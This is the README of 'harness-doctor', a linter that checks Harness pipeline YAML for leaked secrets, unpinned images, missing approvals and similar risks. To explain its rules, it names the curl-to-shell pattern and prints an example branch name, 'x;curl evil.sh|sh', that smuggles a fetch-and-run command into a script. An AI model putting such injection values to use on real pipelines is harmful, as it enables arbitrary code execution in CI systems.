# harness-doctor

Lint your Harness pipelines before they reach production, a leaked token, or a 3am page.

Harness will happily save a pipeline that deploys `prod` with no approval, pulls `node:latest`, and keeps an API token in the YAML. harness-doctor reads your `.harness/` folder and tells you, with a line number and a fix.

```
pip install "harness-doctor[schema] @ git+https://github.com/gerardrecinto/harness-doctor"
harness-doctor .harness
```

## What it catches

Run against [`examples/bad/deploy.yaml`](examples/bad/deploy.yaml):

```
examples/bad/deploy.yaml
    14  info     HD009  CI stage 'build' runs steps with no caching
                         fix: set spec.caching.enabled: true or add a Save/Restore Cache step
    28  warning  HD002  step 'install_tools' (Run) has no timeout
                         fix: add timeout: 10m
    28  warning  HD006  step 'install_tools' pipes a download into a shell
                         fix: download to a file, check its sha256, then execute
    35  error    HD001  env var 'NPM_TOKEN' in step 'tag_release' holds a literal value
                         fix: use <+secrets.getValue("npm_token")>
    35  warning  HD003  image 'node:latest' in step 'tag_release' uses the latest tag
                         fix: pin a version tag or an @sha256 digest
    35  warning  HD007  step 'tag_release' puts <+codebase.branch> directly in the script
                         fix: pass it through envVariables and read it quoted: "$VAR"
    47  warning  HD004  stage 'deploy_prod' deploys with no rollback
                         fix: add rollbackSteps or a StageRollback failure strategy
    47  error    HD005  stage 'deploy_prod' deploys to 'prod' with no approval before it
                         fix: add a HarnessApproval stage ahead of this one

2 errors, 5 warnings, 1 info in 1 file
```

| Rule | Severity | Catches |
|------|----------|---------|
| HD001 | error | Literal secrets in env vars, `String` variables, or credential-shaped strings |
| HD002 | warning | Steps with no `timeout` |
| HD003 | warning | Images with no tag, `:latest`, anything not pinned |
| HD004 | warning | Deployment stages with no rollback path |
| HD005 | error | Production deploys with no approval stage ahead of them |
| HD006 | warning | `curl ... \| sh` |
| HD007 | warning | Branch names, PR titles or commit messages interpolated into a script |
| HD008 | warning | `privileged: true` |
| HD009 | info | CI stages that run steps with no caching |

`harness-doctor explain HD007` says why a rule exists. HD007 is the one most teams miss: Harness substitutes `<+codebase.branch>` into the script text before the shell parses it, so a branch named `x;curl evil.sh|sh` runs as code. Pass it through `envVariables` and read it quoted.

## Use it

```
harness-doctor check .harness                       # exit 1 on any error
harness-doctor check .harness --fail-on warning     # stricter
harness-doctor check .harness --ignore HD009
harness-doctor check .harness --format sarif        # for GitHub code scanning
harness-doctor check .harness --format json
harness-doctor schema .harness                      # validate against Harness's published JSON schema
```

Silence one finding with a comment on the line, or either of the two lines above it:

```yaml
# harness-doctor: ignore HD002
- step:
```

Exit codes: `0` clean, `1` findings at or above `--fail-on`, `2` bad input.

### GitHub Action

```yaml
- uses: actions/checkout@v4
- uses: gerardrecinto/harness-doctor@main
  with:
    path: .harness
    fail-on: warning
    schema: "true"
```

Findings show up in the Security tab through SARIF.

### Harness policy

[`policies/pipeline_guardrails.rego`](policies/pipeline_guardrails.rego) enforces the image, timeout and prod-approval rules inside Harness itself. Add it to a policy set on the Pipeline entity, "On Save", and the save fails instead of waiting for someone to notice. It has OPA tests: `opa test --v0-compatible policies`.

## The pipelines in `.harness/`

This repo is built by the pipelines in [`.harness/`](.harness), and harness-doctor lints them on every run.

| File | What it shows |
|------|---------------|
| `templates/python_quality_stage.yaml` | A reusable CI stage template with a runtime-input variable and `allowedValues` |
| `pipelines/ci.yaml` | Two template stages in parallel (Python 3.10, 3.13), then a dogfood stage that lints and schema-checks the pipelines themselves |
| `pipelines/release.yaml` | Approval stage, then build and publish with the token pulled from a Harness secret |
| `triggers/pull_request.yaml` | PR webhook with `autoAbortPreviousExecutions` |
| `triggers/release.yaml` | GitHub release webhook that passes the tag into the build |

CI also runs on GitHub Actions ([`ci.yml`](.github/workflows/ci.yml)): tests on Python 3.10 to 3.13, ruff, the OPA tests, and `harness-doctor schema` over every pipeline file. Every file in `.harness/` validates against Harness's published schema.

To run them in your own account: import the folder with Git Experience, then create a GitHub connector with the identifier `github` at account level and a secret named `pypi_token`. Both are placeholders in the YAML.

## Develop

```
python -m venv .venv && .venv/bin/pip install -e '.[dev]'
.venv/bin/pytest -q
.venv/bin/ruff check src tests
```

To add a rule, write a function in `src/harness_doctor/rules.py` decorated with `@rule(...)` that yields `(line, message, hint)`, and add a case to `tests/test_rules.py`.

MIT licensed.
